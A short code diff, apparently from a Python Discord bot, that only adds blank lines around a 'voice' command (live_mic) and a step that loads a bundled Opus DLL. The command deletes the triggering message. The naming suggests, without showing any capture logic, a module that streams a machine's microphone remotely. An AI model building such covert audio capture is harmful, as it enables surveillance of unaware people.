@@ -7,6 +7,7 @@ import os
 #</imports>
 
 #<command>
+
 @client.command(name="voice")
 async def live_mic(ctx, option=None):
     await ctx.message.delete()
@@ -28,6 +29,7 @@ async def live_mic(ctx, option=None):
 #</command>
 
 #<preload>
+
 bundle_dir = os.path.dirname(os.path.abspath(__file__))
 opuslib_path = bundle_dir + 'resources/modules/libopus-0.x64.dll'
 discord.opus.load_opus(opuslib_path)
